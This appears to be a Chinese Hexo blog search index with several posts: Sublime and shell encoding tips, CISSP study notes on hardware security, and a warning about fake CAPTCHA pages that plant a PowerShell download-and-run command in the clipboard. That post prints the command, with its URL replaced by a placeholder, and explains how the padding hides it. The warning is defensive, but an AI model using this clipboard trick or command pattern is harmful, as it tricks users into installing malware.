<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>sublimetips</title>
    <link href="/2025/02/13/yunwei/yunweitips/sublimetips/"/>
    <url>/2025/02/13/yunwei/yunweitips/sublimetips/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="删除空行"><a href="#删除空行" class="headerlink" title="删除空行"></a>删除空行</h2><p>MAC 下 command+option+F 打开搜索替换框</p><p>使用以下正则搜索</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">^\s*$\n<br><br></code></pre></td></tr></table></figure><p><code>^</code> 表示行的开头</p><p><code>\s*</code>表示任意数量的空白字符（包含空格、制表符等）</p><p><code>$</code> 表示行的结尾</p><p><code>\n</code> 表示换行符</p><p>替换框留空替换即可</p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>tips</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>yunweitips</tag>
      
      <tag>sublime</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>人工验证挂马</title>
    <link href="/2025/02/13/security/netsec/%E6%8C%82%E9%A9%AC/%E4%BA%BA%E5%B7%A5%E9%AA%8C%E8%AF%81%E6%8C%82%E9%A9%AC/"/>
    <url>/2025/02/13/security/netsec/%E6%8C%82%E9%A9%AC/%E4%BA%BA%E5%B7%A5%E9%AA%8C%E8%AF%81%E6%8C%82%E9%A9%AC/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><p>来自TK微博</p><p><a href="https://weibo.com/6827625527/Pe6VpcQ9q">https://weibo.com/6827625527/Pe6VpcQ9q</a></p><p>现在黑产有一种新的社交工程学挂马方案。</p><p>你访问一些网站的时候，网页忽然弹出提示，让你证明自己是真人。这倒也很常见，于是你点了一下那个验证窗口，又弹出提示，让你按 Win+R，然后 Ctrl+V，再回车（图一）。</p><p>你按下 Win+R，发现弹出一个窗口。再按 Ctrl+V，窗口里出现了：✅ ‘I am not a robot: CAPTCHA Verification UID: 7811’（图二）。这好像真的是在做验证。但这时只要你再按一下回车，你的电脑就会下载并执行攻击者的木马。</p><p>因为在你最开始点击那个验证窗口的时候，网站向你的剪贴板中写入的内容实际是：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">powershell</span> -w <span class="hljs-number">1</span> -C <span class="hljs-string">&quot;网页链接l)&#125;&quot;</span> <span class="hljs-comment"># ✅ &#x27;I am not a robot: CAPTCHA Verification UID: 7811&#x27;</span><br><br></code></pre></td></tr></table></figure><p>这是一条下载并执行木马的命令。因为 Win+R 弹出的那个命令执行输入框地宽度有限，对过长的输入行只显示末尾部分。攻击者精确地控制内容长度，巧妙地让你只能看到末尾那段一点都不可疑的内容。等你明白过来的时候，已经晚了。</p><p>图三显然是一个受害者。</p><p><img src="/007s41inly1hyj2g41sovj30rq0uojvy.jpg" alt="img"></p><p><img src="/007s41inly1hyj2l0w14wj30he091419.jpg" alt="img"></p><p><img src="/007s41inly1hyj2m5a4qkj30r70inguy.jpg" alt="img"></p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>netsec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>netsec</tag>
      
      <tag>挂马</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>echo</title>
    <link href="/2025/02/06/yunwei/yunweicommands/echo/"/>
    <url>/2025/02/06/yunwei/yunweicommands/echo/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h2><h3 id="n-取消输出末尾的换行符"><a href="#n-取消输出末尾的换行符" class="headerlink" title="-n 取消输出末尾的换行符"></a>-n 取消输出末尾的换行符</h3><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@nvm</span>- tmp]<span class="hljs-meta"># echo -n adb</span><br>adb[root<span class="hljs-symbol">@nvm</span>- tmp]<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@nvm</span>- tmp]<span class="hljs-meta"># echo adb</span><br>adb<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>yunweicommands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>yunweicommands</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>encode_decode</title>
    <link href="/2025/02/06/yunwei/yunweitips/encode_decode/"/>
    <url>/2025/02/06/yunwei/yunweitips/encode_decode/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="Base64-编码-解码"><a href="#Base64-编码-解码" class="headerlink" title="Base64 编码&#x2F;解码"></a>Base64 编码&#x2F;解码</h3><h4 id="Base64-编码-base64"><a href="#Base64-编码-base64" class="headerlink" title="Base64 编码 base64"></a>Base64 编码 base64</h4><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@nvm</span>- tmp]<span class="hljs-meta"># echo -n abc | base64</span><br>YWJj<br></code></pre></td></tr></table></figure><h4 id="Base64-解码-base64-–decode"><a href="#Base64-解码-base64-–decode" class="headerlink" title="Base64 解码 base64 –decode"></a>Base64 解码 base64 –decode</h4><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@nvm</span>- tmp]<span class="hljs-meta"># echo -n <span class="hljs-string">&quot;YWJj&quot;</span> | base64 --decode</span><br>abc[root<span class="hljs-symbol">@nvm</span>- tmp]<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><h3 id="Hex（十六进制）编码-解码"><a href="#Hex（十六进制）编码-解码" class="headerlink" title="Hex（十六进制）编码&#x2F;解码"></a>Hex（十六进制）编码&#x2F;解码</h3><p>将二进制数据转换为十六进制字符串，十六进制字符串表示方法为\x编码值</p><h4 id="Hex-编码-xxd-p"><a href="#Hex-编码-xxd-p" class="headerlink" title="Hex 编码 xxd -p"></a>Hex 编码 xxd -p</h4><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@nvm</span>- tmp]<span class="hljs-meta"># echo -n abc | xxd -p</span><br><span class="hljs-number">616263</span><br></code></pre></td></tr></table></figure><p>\x61\x62\63  &lt;&#x3D;&#x3D;&gt; abc</p><h4 id="Hex-解码-xxd-r-p"><a href="#Hex-解码-xxd-r-p" class="headerlink" title="Hex 解码 xxd -r -p"></a>Hex 解码 xxd -r -p</h4><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@nvm</span>- tmp]<span class="hljs-meta"># echo -n <span class="hljs-string">&quot;6162630a&quot;</span> | xxd -r -p</span><br>abc<br></code></pre></td></tr></table></figure><h3 id="Octal（八进制）编码-解码"><a href="#Octal（八进制）编码-解码" class="headerlink" title="Octal（八进制）编码&#x2F;解码"></a>Octal（八进制）编码&#x2F;解码</h3><p>将二进制数据转换为八进制字符串</p><h4 id="Octal（八进制）编码-od-An-to1"><a href="#Octal（八进制）编码-od-An-to1" class="headerlink" title="Octal（八进制）编码  od -An -to1"></a>Octal（八进制）编码  od -An -to1</h4><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@nvm</span>- tmp]<span class="hljs-meta"># echo -n <span class="hljs-string">&quot;abc&quot;</span> | od -An -to1</span><br> <span class="hljs-number">141</span> <span class="hljs-number">142</span> <span class="hljs-number">143</span><br></code></pre></td></tr></table></figure><h4 id="Octal（八进制）解码-printf"><a href="#Octal（八进制）解码-printf" class="headerlink" title="Octal（八进制）解码 printf"></a>Octal（八进制）解码 printf</h4><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">[root<span class="hljs-title">@nvm-</span> tmp]# printf <span class="hljs-string">&quot;<span class="hljs-char escape_">\14</span>1<span class="hljs-char escape_">\14</span>2<span class="hljs-char escape_">\14</span>3&quot;</span><br>abc<br></code></pre></td></tr></table></figure><h3 id="Binary（二进制）编码-解码"><a href="#Binary（二进制）编码-解码" class="headerlink" title="Binary（二进制）编码&#x2F;解码"></a>Binary（二进制）编码&#x2F;解码</h3><p>将二进制数据转换为二进制字符串</p><h4 id="Binary（二进制）编码-xxd-b"><a href="#Binary（二进制）编码-xxd-b" class="headerlink" title="Binary（二进制）编码 xxd -b"></a>Binary（二进制）编码 xxd -b</h4><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dns">[root@nvm-<span class="hljs-number">9</span>s4arqnxftb0 tmp]# echo -n abc | xxd -b<br><span class="hljs-number">00000000</span>: <span class="hljs-number">01100001</span> <span class="hljs-number">01100010</span> <span class="hljs-number">01100011</span>                             abc<br></code></pre></td></tr></table></figure><h4 id="Binary（二进制）解码"><a href="#Binary（二进制）解码" class="headerlink" title="Binary（二进制）解码"></a>Binary（二进制）解码</h4><h3 id="ASCII-编码-解码"><a href="#ASCII-编码-解码" class="headerlink" title="ASCII 编码&#x2F;解码"></a>ASCII 编码&#x2F;解码</h3><p>将二进制数据转换为 ASCII 字符</p><h4 id="ASCII-编码-od-An-tu1"><a href="#ASCII-编码-od-An-tu1" class="headerlink" title="ASCII 编码 od -An -tu1"></a>ASCII 编码 od -An -tu1</h4><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tap">[root@nvm- tmp]<span class="hljs-comment"># echo -n abc | od -An -tu1</span><br> <span class="hljs-number"> 97 </span><span class="hljs-number"> 98 </span> 99<br></code></pre></td></tr></table></figure><h4 id="ASCII-解码-printf-‘-b’"><a href="#ASCII-解码-printf-‘-b’" class="headerlink" title="ASCII 解码 printf ‘%b’"></a>ASCII 解码 printf ‘%b’</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>tips</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>yunweitips</tag>
      
      <tag>encode_decode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cissp-9安全漏洞、威胁和对策</title>
    <link href="/2025/02/05/security/seccert/cissp/cissp-9%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E3%80%81%E5%A8%81%E8%83%81%E5%92%8C%E5%AF%B9%E7%AD%96/"/>
    <url>/2025/02/05/security/seccert/cissp/cissp-9%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E3%80%81%E5%A8%81%E8%83%81%E5%92%8C%E5%AF%B9%E7%AD%96/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><p>安全专业人员必须密切关注系统本身，并确保其更高级别的保护控制并非建立在不牢靠的基础之上。</p><h1 id="9-1共担责任"><a href="#9-1共担责任" class="headerlink" title="9.1共担责任"></a>9.1共担责任</h1><p>共担责任（shared responsibility）是安全设计的原则，表明任何机构都不是孤立运行的。</p><p><strong>机构里的每个人都负有一定的安全责任</strong>。</p><p>1、建立和维护安全是CISO和安全团队的职责。依照安全规定执行自己的任务是正式员工的职责。监控环境是否存在违规行为是审计员的职责。</p><p>2、机构对利益相关方负有作出周密安全决策以保持机构可持续发展的责任。</p><p>3、与第三方合作时，每个实体都要清楚自己在执行正常操作和维护安全方面所应承担的那部分共担责任，即共担责任模型。</p><p>4、当意识到新漏洞和新威胁的存在时，应该负责地将信息披露给相关供应商或信息共享中心（也叫威胁情报来源或服务）。</p><h1 id="9-2评价和弥补安全架构、设计和解决方案元素的漏洞"><a href="#9-2评价和弥补安全架构、设计和解决方案元素的漏洞" class="headerlink" title="9.2评价和弥补安全架构、设计和解决方案元素的漏洞"></a>9.2评价和弥补安全架构、设计和解决方案元素的漏洞</h1><p>系统越复杂，所能提供的保证就越少。更高的复杂性意味着存在漏洞的区域更多，需要抵御威胁的区域也更多。</p><h2 id="硬件"><a href="#硬件" class="headerlink" title="硬件"></a>硬件</h2><p>硬件（hardware）包含计算机中可以被实际触摸到的任何有形部分：键盘、显示器、CPU、存储介质和内存芯片等。</p><h3 id="CPU"><a href="#CPU" class="headerlink" title="CPU"></a>CPU</h3><p>中央处理单元（central processing unit，CPU），也被称为处理器（processor）或微处理器（microprocessor），是计算机的神经中枢-这块芯片（或者多处理器系统中的多块芯片）控制着所有主要操作。</p><p>CPU只执行一组有限的计算和逻辑操作，是为了加快执行计算和逻辑操作速度。</p><h3 id="执行类型"><a href="#执行类型" class="headerlink" title="执行类型"></a>执行类型</h3><h4 id="多任务处理"><a href="#多任务处理" class="headerlink" title="多任务处理"></a>多任务处理</h4><p>多任务处理（multitasking）是指同时处理两个或多个任务。</p><p>单核多任务处理系统，在任意给定时刻都只执行一个进程。</p><h4 id="多核"><a href="#多核" class="headerlink" title="多核"></a>多核</h4><p>多核（multicore）CPU，可以同时和或独立执行内核的芯片。</p><h4 id="多重处理"><a href="#多重处理" class="headerlink" title="多重处理"></a>多重处理</h4><p>多重处理（multiprocessing），一个多处理器系统驾驭多个处理器的处理能力来完成一个多线程应用的执行。</p><p>某些多处理器系统可能会把某种进程或执行分配或指定给某个特定CPU或内核处理，这就是<strong>亲和性</strong>（affinity）。</p><h4 id="多程序设计"><a href="#多程序设计" class="headerlink" title="多程序设计"></a>多程序设计</h4><p>多程序设计（multiprogramming）类似于多任务处理。由操作系统进行协调，假性地在单个处理器上同时执行两个任务，以提供效率。</p><p>单程序完成时间延迟，完成所有任务时间缩短</p><h4 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h4><p>多线程（multithreading）允许在一个进程中执行多个并发任务。</p><p>多任务处理是多个任务占用多个进程，多线程是多个任务占用一个进程。</p><p>多线程常用于因多个活动进程之间频繁的上下文切换而导致开销过大且效率下降的应用程序。</p><h3 id="保护机制"><a href="#保护机制" class="headerlink" title="保护机制"></a>保护机制</h3><h4 id="保护环-protection-ring"><a href="#保护环-protection-ring" class="headerlink" title="保护环 protection ring"></a>保护环 protection ring</h4><p>把操作系统中的代码和组件（以及应用程序、在操作系统控制下运行的其他代码）组成同心环，越靠近中心，权限级别就越高。</p><p>4个环的模型（0-3）</p><p><img src="/image-20250210191841477.png" alt="image-20250210191841477"></p><p><strong>环0： 操作系统内核</strong> - 最内层的环，环 0 具有最高级别权限，基本可以访问任何资源、文件和内存位置。操作系统内核部分始终驻留在内存中。</p><p><strong>环 1： 其他操作系统组件</strong>是操作系统的非内核部分（各种被请求的任务、被执行的操作、被切换的进程等进出内存的部分）占用。</p><p><strong>环 2 ：驱动程序</strong>是 I&#x2F;O 驱动程序和系统实用程序驻留的地方，能访问应用和其他程序本身无法直接访问的外围设备、特殊文件等。</p><p><strong>环 3 ：用户层面的程序和应用</strong> - 是应用程序和其他程序占用。</p><p>内核（kernel mode）模式&#x2F;特权（privileged mode）模式：系统层面访问，也就是环0-环2</p><p>用户（user mode）模式：用户层面的程序和应用，也就是环 3 </p><p>系统调用：编号较高的环中运行的进程通常必须向编号较低环中的处理程序或驱动程序请求他们所需要的服务。</p><h4 id="进程状态"><a href="#进程状态" class="headerlink" title="进程状态"></a>进程状态</h4><p>进程状态（process state）也叫操作状态（operating state），是指进程运行的各种执行形式。</p><p>操作系统任何时刻都处于以下两种模式之一</p><p>管理程序状态 supervisor state：以被授予权限、可完全访问模式运行</p><p>问题状态 problem state：在与用户模式下运行，权限较低，所有访问请求必须经过授权凭证检查才会被准许或拒绝</p><h5 id="就绪状态"><a href="#就绪状态" class="headerlink" title="就绪状态"></a>就绪状态</h5><p>就绪状态（ ready state ）是指进程已经做好准备，被安排执行时可立即恢复或开始处理。</p><h5 id="运行状态"><a href="#运行状态" class="headerlink" title="运行状态"></a>运行状态</h5><p>运行状态（running state）是指进程在CPU上执行并持续运行的状态，直到完成运行或时间片用完（进入就绪状态）或被阻塞（通常是等待IO，进入等待状态）</p><h5 id="等待状态"><a href="#等待状态" class="headerlink" title="等待状态"></a>等待状态</h5><p>等待状态（waiting state）是指已准备好继续执行，只等待IO完成后，进入就绪状态</p><h5 id="管理程序状态"><a href="#管理程序状态" class="headerlink" title="管理程序状态"></a>管理程序状态</h5><p>是指进程执行的操作，要求高权限（包括修改系统配置、安装设备驱动程序、修改安全配置等）时，进程进入管理程序状态。</p><p>也可以说，不在用户模式（环 3 ）下的任何功能基本上都会在管理程序模式下执行。</p><h5 id="停止状态"><a href="#停止状态" class="headerlink" title="停止状态"></a>停止状态</h5><p>停止状态（stopped state）是指当进程结束或必须终止（因为发生错误、需要的资源不可用、某项资源请求无法满足）时，进入停止状态，操作系统将回收分配给该进程的所有内存和资源。</p><p><img src="/image-20250210200058664.png" alt="image-20250210200058664"></p><h3 id="操作模式"><a href="#操作模式" class="headerlink" title="操作模式"></a>操作模式</h3><h5 id="用户模式"><a href="#用户模式" class="headerlink" title="用户模式"></a>用户模式</h5><p>用户模式是 CPU 在执行用户应用程序时使用的基本模式，只允许执行其全部指令集 中的部分指令。</p><h5 id="特权模式"><a href="#特权模式" class="headerlink" title="特权模式"></a>特权模式</h5><p>特权模式是  CPU 可以访问CPU支持的所有指令，也被称为管理程序模式、系统模式或内核模式。</p><p>注意：</p><p>所有用户（包括系统管理员）的应用程序都以用户模式运行。</p><h3 id="存储器"><a href="#存储器" class="headerlink" title="存储器"></a>存储器</h3><h4 id="只读存储器-ROM"><a href="#只读存储器-ROM" class="headerlink" title="只读存储器 ROM"></a>只读存储器 ROM</h4><p>只读存储器（read-only  memory，ROM）是可以读取但不能更改（不允许写入）的存储器。通常包含“引导”信息，引导计算器启动。引导程序包含每次引导运行时的开机自检（power-on self-test，POST）系列诊断。</p><h5 id="可编程只读存储器"><a href="#可编程只读存储器" class="headerlink" title="可编程只读存储器"></a>可编程只读存储器</h5><p>可编程只读存储器（programmable read-only memory，PROM）</p><p>允许日后写入，写入后无法修改</p><h5 id="可擦除可编程只读存储器"><a href="#可擦除可编程只读存储器" class="headerlink" title="可擦除可编程只读存储器"></a>可擦除可编程只读存储器</h5><p>可擦除PROM（erasable PROM，EPROM）</p><p>分为两类：</p><p>紫外线擦除EPROM（ultraviolet EPROM，UVEPROM）通过紫外线光照射擦除</p><p>电子可擦除EPROM（electronically erasable PROM，EEPROM），通过传递到芯脚的电压强制擦除。</p><h5 id="电子可擦除可编程只读存储器"><a href="#电子可擦除可编程只读存储器" class="headerlink" title="电子可擦除可编程只读存储器"></a>电子可擦除可编程只读存储器</h5><p>电子可擦除EPROM（electronically erasable PROM，EEPROM），通过传递到芯脚的电压强制擦除。</p><p>相对UVEPROM会更加灵活友好。</p><h5 id="闪存"><a href="#闪存" class="headerlink" title="闪存"></a>闪存</h5><p>闪存（flash memory）EEPROM的衍生概念。</p><p>一种非易失性存储介质，可以通过电子方式擦除和重写。</p><p>与EEPROM区别：</p><p>EEPROM必须完全擦除后重写</p><p>闪存可以按块擦除重写</p><p>NAND闪存是常见的闪存类型，广泛用于存储卡、优盘、移动硬盘和固态硬盘SSD</p><h4 id="随机存取存储器-RAM"><a href="#随机存取存储器-RAM" class="headerlink" title="随机存取存储器 RAM"></a>随机存取存储器 RAM</h4><p>随机存取存储器（random access memory，RAM）属于可读写存储器。</p><p>RAM只能临时存储数据，只在供电期间保留数据。</p><h5 id="真实内存"><a href="#真实内存" class="headerlink" title="真实内存"></a>真实内存</h5><p>真实内存（real memory）也叫主内存（main memory or  primary memory）</p><p>多个动态芯片构成，一般为计算机最大可用RAM资源，必须由CPU定期刷新。</p><h5 id="高速缓存-RAM"><a href="#高速缓存-RAM" class="headerlink" title="高速缓存 RAM"></a>高速缓存 RAM</h5><p>高速缓存（cache RAM）是将数据从较慢的存储介质读取临时存储在较快的存储介质中，以提高性能。</p><p>高速缓存也被称为L1、L2、L3和L4缓存（L代表级别）</p><p>L1和L2常专门用于单个处理器内核。</p><p>L3常用于内核间共享的高速缓存。</p><p>L4常被安装在主板或GPU（图形处理单元）上。</p><p>硬盘驱动器HDD、固态硬盘SSD和某些U盘，也会包含高速缓存。</p><h6 id="动态RAM和静态RAM"><a href="#动态RAM和静态RAM" class="headerlink" title="动态RAM和静态RAM"></a>动态RAM和静态RAM</h6><p><strong>动态RAM</strong>使用电容器，电容器保持电荷代表1，电容器不包持电荷代表0，电容器会随着时间放电，需要CPU刷新动态RAM的内容，避免内容发生变化。</p><p><strong>静态RAM</strong>使用逻辑装置触发器，是一个通过切换位置改变比特0 1 的开关，只要不断电，静态存储器就会保持内部不变，不需要CPU刷新。</p><h4 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h4><p>寄存器（register）处于CPU中，其在CPU中的数量有限，可以为算数逻辑单元（arithmetic-logical unit，ALU）提供执行计算或处理指令时可直接访问的存储位置。</p><p>寄存器的大小和数量会因为系统的不同而异。</p><p>CPU一般有8-32个寄存器，大小一般是32位或64位。</p><p>优点：</p><p>寄存器是 ALU 的一部分，会以典型的CPU速度与CPU同步调用允许。</p><h4 id="内存寻址"><a href="#内存寻址" class="headerlink" title="内存寻址"></a>内存寻址</h4><p>处理器在使用内存资源时必须通过内存寻址（memory addressing）来关联内存的各个位置。</p><h5 id="寄存器寻址"><a href="#寄存器寻址" class="headerlink" title="寄存器寻址"></a>寄存器寻址</h5><p>当CPU需要用一个寄存器中的信息来完成某项操作时，会按寄存器地址来访问寄存器内容。</p><h5 id="立即寻址"><a href="#立即寻址" class="headerlink" title="立即寻址"></a>立即寻址</h5><p>立即寻址（immediate addressing）是一种关联数据的方式，数据作为指令的组成部分被提供给CPU。</p><h5 id="直接寻址"><a href="#直接寻址" class="headerlink" title="直接寻址"></a>直接寻址</h5><p>直接寻址（direct addressing）中，CPU将获得访问的内存位置的一个实际地址，该地址必须要与正在执行指令在同一个内存页面上。</p><h5 id="间接寻址"><a href="#间接寻址" class="headerlink" title="间接寻址"></a>间接寻址</h5><p>间接寻址（indirect addressing）中，CPU获得的不是实际数值的内存地址，而是一个存储实际数值地址的地址。</p><h5 id="基址-偏移量寻址"><a href="#基址-偏移量寻址" class="headerlink" title="基址+偏移量寻址"></a>基址+偏移量寻址</h5><p>基址+偏移量寻址（base + offset addressing）中，CPU使用保存在寄存器或指针中的数值作为基本地址，通过把指令中的和基本地址相加，获取实际数值的地址。</p><h4 id="二级内存"><a href="#二级内存" class="headerlink" title="二级内存"></a>二级内存</h4><p>二级内存（secondary memory）是指磁性、光学或基于闪存的介质或其他存储设备，CPU不能直接读取，需要操作系统先加载到真实内存中，CPU再使用。</p><p>虚拟内存（virtual memory）是一种特殊的二级内存，用于扩展真实内存的可寻址空间。</p><p>常见虚拟内存类型：</p><p>1、页面文件（pagefile）</p><p>2、交换文件（swapfile）</p><p>CPU需要访问虚拟内存中的数据时，会先检查是否驻留在内存中（可以直接访问），如果已经交换到硬盘中，会进行分页操作。</p><p>操作系统把数据从硬盘读取到真实内存的过程，叫做分页。</p><p>缺点：</p><p>主内存和二级内存之间交换数据时分页操作速度相对较慢。</p><h3 id="数据存储设备"><a href="#数据存储设备" class="headerlink" title="数据存储设备"></a>数据存储设备</h3><p>数据存储设备（data storage device）用于存储被写入计算机可随时使用的信息。</p><h4 id="主存储设备与辅助存储设备"><a href="#主存储设备与辅助存储设备" class="headerlink" title="主存储设备与辅助存储设备"></a>主存储设备与辅助存储设备</h4><p>主存储设备也称为主内存，是指被计算机用来在允许过程中保存随时可以供CPU使用信息的RAM。</p><p>辅助存储设备也称为二级内存，由磁性和光学介质组成，常见的有硬盘驱动器（HDD）、固态硬盘（SSD）、闪存驱动器、磁带、CD、DVD和闪存卡等。</p><h4 id="易失性存储设备与非易失性存储设备"><a href="#易失性存储设备与非易失性存储设备" class="headerlink" title="易失性存储设备与非易失性存储设备"></a>易失性存储设备与非易失性存储设备</h4><p>存储的易失性判断标准是在断电时数据丢失可能性。</p><p>非易失的是长期可以保存数据的设备，例如：磁性介质、光学介质和ROM。</p><p>易失的是断电后丢失数据的设备，例如：静态RAM模块、动态RAM模块。</p><h4 id="随机存取与顺序存取"><a href="#随机存取与顺序存取" class="headerlink" title="随机存取与顺序存取"></a>随机存取与顺序存取</h4><p>随机存取存储设备（random access storage），允许操作系统通过某种类型的寻址方式直接从设备任意位置读取或写入数据，几乎所有的主存储器都是随机存取存储设备。</p><p>顺序存取存储设备（sequential storage），要求操作系统读取指定位置数据之前需要读取之前所有数据，磁带就是顺序存取存储设备。</p><h4 id="存储器的安全问题"><a href="#存储器的安全问题" class="headerlink" title="存储器的安全问题"></a>存储器的安全问题</h4><p>1、断电后依然保留数据的介质需要注意，包括不限于二级内存、ROM、PROM、EPROM、EEPROM等。</p><p>2、易失性设备在断电后的一段时间内依然保留一部分电量，存在利用这些电量恢复数据的可能性。</p><p>3、冷启动攻击：在系统关机或RAM从主机拔出时冻结芯片减少数据衰减；内存映像转储和系统奔溃转储攻击获取加密密钥。</p><h3 id="存储介质的安全"><a href="#存储介质的安全" class="headerlink" title="存储介质的安全"></a>存储介质的安全</h3><p>1、数据被擦除后任然有可能保留在辅助存储设备上，也就是数据残留（data remanence），数据从硬盘被删除或者硬盘被格式化，也有程序可以从硬盘恢复数据。</p><p>解决方案：使用专门程序覆盖硬盘所有痕迹（也叫净化）或者损坏、销毁设备本身，导致其不能恢复。</p><p>2、传统的归零擦除对SSD效果不佳，因为怀块可能不会覆盖到。</p><p>SSD作为大容量闪存辅助存储设备，会存在用于坏块替换的备用内存块。</p><p>SSD针对故障率，一般采用两种方式，第一种是故障的内存块标记为坏块，使用备用块，另一种是在所有的块上均匀的写入和擦除，尽可能提供使用寿命。</p><p>3、辅助存储设备存在失窃风险</p><p>解决方案：辅助存储设备本身实施全盘加密，常见的HDD、SSD和闪存本身存在加密功能。</p><p>4、可移动介质存在很大信息泄漏风险，需要通过加密技术确保安全。</p><h4 id="发射安全"><a href="#发射安全" class="headerlink" title="发射安全"></a>发射安全</h4><p>许多设备发射的电信号或辐射（WI-FI、蓝牙、GPS和移动电话信号）都存在被拦截窃取敏感信息的风险。</p><p>攻击手段</p><p>1、TEMPEST窃听</p><p>2、Van Eck偷听（Van Eck Phreaking）</p><p>TEMPEST的衍生技术，可以从远处窃取设备产生的辐射信息</p><p>防御手段</p><p>1、法拉第笼（Faraday cage）</p><p>给盒子、可移动的房间或整个建筑包裹一层金属丝网，将其全方面包裹。</p><p>2、白噪声（white noise）</p><p>指通过广播假通信流来掩盖和隐藏真实信号辐射的存在。</p><p>3、控制区（control zone）</p><p>对某个区域同时使用法拉第笼和白噪声，其他区域不受限制。</p><h3 id="输入和输出设备"><a href="#输入和输出设备" class="headerlink" title="输入和输出设备"></a>输入和输出设备</h3><h4 id="显示器"><a href="#显示器" class="headerlink" title="显示器"></a>显示器</h4><p>TEMPEST 技术可以用来危害显示器展示的数据安全。</p><p>传统阴极射线管（CRT）显示器更容易产生辐射。</p><p>现代的液晶显示器（LCD）、发光二极管（LED）、有机发光二极管（OLED）和量子点发光二极管（QLED）也会产生少量辐射。</p><p>最大风险为肩窥，肉眼或摄像机偷看屏幕内容。</p><h4 id="打印机"><a href="#打印机" class="headerlink" title="打印机"></a>打印机</h4><p>带走打印出来的敏感信息或许要比用 闪存盘或磁性介质带走敏感信息容易得多。</p><h4 id="键盘-鼠标"><a href="#键盘-鼠标" class="headerlink" title="键盘&#x2F;鼠标"></a>键盘&#x2F;鼠标</h4><p>受到TEMPEST影响</p><h4 id="调制解调器"><a href="#调制解调器" class="headerlink" title="调制解调器"></a>调制解调器</h4><p>1、评估业务是否需要完全禁用调制解调器</p><p>2、确保调制解调器在网络中的物理和逻辑位置</p><h2 id="固件"><a href="#固件" class="headerlink" title="固件"></a>固件</h2><p>固件（firmware）也称为微码（miscrocode），存储在ROM芯片中的软件。</p><p>固件通常用于移动设备、物联网设备、边缘计算设备、雾计算设备和工业控制系统。</p><p>BIOS，基本输入输出系统（base input&#x2F;output system）是镶嵌在主板EEPROM或闪存芯片上的传统固件。</p><p>包含计算机启动和从磁盘加载操作系统时所需的独立于操作系统的原始指令。</p><p>UEFI，统一可扩展固件接口（unified extensible firmware interface）用于取代BIOS，支持BIOS所有功能，缩短了启动时间，增加了安全性能。</p><p>刷新（flashing）是更新 UEFI 、BIOS或固件的过程。如果恶意软件或人员可以更改UEFI、BIOS或固件，则就存在绕过相关安全机制实施攻击。</p><p>UEFI存在引导认证（boot attestation）或安全引导（secure boot）功能，确保只有通过认证（通过核查数字签名方式完成验证和批准过程）的驱动程序或操作系统可以安装和加载到本地系统上。</p><p>UEFI存在可选的测量启动（measured 